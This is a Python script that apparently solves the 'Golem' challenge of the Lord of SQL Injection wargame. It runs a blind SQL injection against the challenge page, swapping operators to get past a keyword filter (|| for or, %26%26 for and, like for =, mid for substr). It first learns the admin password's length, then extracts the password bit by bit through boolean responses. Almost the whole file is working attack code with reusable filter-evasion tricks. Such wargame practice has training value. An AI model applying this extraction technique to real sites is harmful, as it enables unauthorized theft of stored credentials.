#!/usr/bin/python
# coding: utf-8

import requests
import sys          # module for exit()
from sys import stdout      # module for fflush()


print("#### Lord of SQL Injection - Golem ####\n")

# URL을 설정합니다.
url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"

session = raw_input("Input your LOS session : ")
# session = "lqaa55h0s48l8h06rc9sguktt0"

# Set header to set cookie
headers = {
    'Cookie': 'PHPSESSID={0}'.format(session)
}


""" The valuble for storing admin password """
password = ""

query = 0



"""
No Hack Words : 
 - prob
 - _
 - .
 - ()
 - or
 - and
 - substr(
 - =

"""


def replace(param):
    param = str(param)

    param = param.replace("or", "||")
    param = param.replace("and", "%26%26")
    param = param.replace("=", " like ")
    param = param.replace("substr(", "mid(")
    param = param.replace("#", "%23")

    if "prob" in param:
        print "Your param has 'prob'!"
        sys.exit()

    return param



# get the length of password 
for i in range(100):
    param = replace("' or length(pw)={0}#".format(i))
    content = requests.get(url + "?pw=" + param, headers=headers).text

    if content.find("<h2>Hello admin</h2>") > -1:
        length = i
        print "[*] The length of pw : {0}".format(i)
        
        break



print("\n\n#### Starting Blind SQL Injection ####\n")
for i in range(1, length + 1):
    binary = ''
    for j in range(0, 8):
        param = "?pw=' || id like 'admin' %26%26 (select mid(lpad(bin(ascii(mid(pw,{0},1))),7,0),{1},1) like 1)%23".format(i, j)
        content = requests.get(url + param, headers=headers).text
        query += 1

        if content.find("Hello admin") > 0:
            binary += '1'
        else:
            binary += '0'

    password += chr(int(binary, 2))

    print chr(int(binary, 2)), "({0})".format(binary)
    stdout.flush()

print "\n[*] the password : ", password



url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw={0}".format(password)
r = requests.get(url, headers=headers)

if r.text.find("<h2>GOLEM Clear!</h2>") > 0:
    print "[*] message : Golem Clear!"

print "[*] total queries : {0}".format(query)
    
